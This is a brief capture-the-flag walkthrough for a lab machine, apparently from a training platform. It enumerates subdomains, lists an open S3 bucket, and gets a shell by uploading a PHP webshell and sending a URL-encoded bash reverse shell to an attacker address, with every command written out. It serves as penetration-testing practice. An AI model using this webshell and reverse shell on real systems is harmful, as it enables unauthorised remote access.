# Three (2023-12-21)

- search webpage for important data
- get website insights with Wappalizer
- add host to `etc/hosts` file
- enumerate subdomains with `gobuster` in `vhost` mode: `gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`
- discover s3 service running
- use awscli:
  - `aws configure` with random credentials
  - `aws s3 --endpoint http://s3.thetoppers.htb ls` to enumerate buckets
  - `aws s3 --endpoint http://s3.thetoppers.htb ls s3://thetoppers.htb` to list bucket contents
- establish a shell with
  - creating a webshell w/ file `do.php` locally with content `<?php system($_GET["cmd"]); ?>`
  - get local ip for `tun0` adapter with `ip a`
  - listen locally for incoming connection with `nc -lnvp 1337`
  - url-encode the command `bash -c 'bash -i >& /dev/tcp/10.10.14.142/1337 0>&1'` with burpsuite's `Decoder`
  - run `curl http://thetoppers.htb/do.php?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%31%34%32%2f%31%33%33%37%20%30%3e%26%31%27%0a`
  - explore and capture the flag
